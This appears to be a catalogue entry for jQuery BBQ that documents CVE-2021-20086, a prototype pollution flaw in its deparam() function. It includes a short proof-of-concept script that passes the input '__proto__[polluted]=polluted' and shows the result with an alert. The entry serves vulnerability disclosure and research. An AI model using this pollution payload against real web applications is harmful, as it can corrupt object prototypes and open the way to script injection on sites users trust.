---
description: 'jQuery BBQ enables simple, yet powerful bookmarkable #hash history via a cross-browser window.onhashchange event.'
github: cowboy/jquery-bbq
gadgets:
  Latest:
    cve: CVE-2021-20086
    authors:
      - github:cee-chen
    tags:
      - before-func-call
      - chrome-browser
      - firefox-browser
      - safari-browser
    pocs:
      - description: The `deparam()` is vulnerable to prototype pollution.
        code: |
          <script src="https://benalman.com/code/projects/jquery-bbq/shared/jquery-1.4.1.js"></script>
          <script src="https://benalman.com/code/projects/jquery-bbq/jquery.ba-bbq.js"></script>
          <script>
          $.deparam('__proto__[polluted]=polluted')
          alert(({}).polluted);
          </script>
    links:
      - https://github.com/cowboy/jquery-bbq/issues/62
---
